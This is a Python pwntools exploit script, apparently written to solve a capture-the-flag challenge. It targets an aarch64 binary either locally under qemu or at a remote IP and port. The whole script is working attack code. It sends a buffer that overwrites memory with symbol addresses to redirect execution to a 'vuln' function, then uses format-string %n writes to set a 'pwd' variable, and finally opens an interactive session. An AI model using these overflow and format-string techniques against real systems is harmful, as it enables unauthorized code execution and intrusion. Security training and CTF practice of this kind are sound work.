#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('155.248.203.119', 42051)
else:
        # -L /usr/aarch64-linux-gnu
        p = process("qemu-aarch64 -L /usr/aarch64-linux-gnu ./chal".split())

# GDB()
input()
# %p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
payload = p64(exe.sym.pwd+4)+ p64(exe.sym.pwd+6)+ b"caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa" + p64(exe.sym.pwd)
sla(b"pwned!", payload + p64(exe.sym.vuln))
sleep(1)
payload = f"%{0x31337}c%8$n".encode()
sl(payload)
sleep(10)
payload = f"%{0x100000}c%10$n".encode()
sl(payload)

sleep(10)
payload = f"%{0x100000}c%11$n".encode()
sl(payload)
p.interactive()
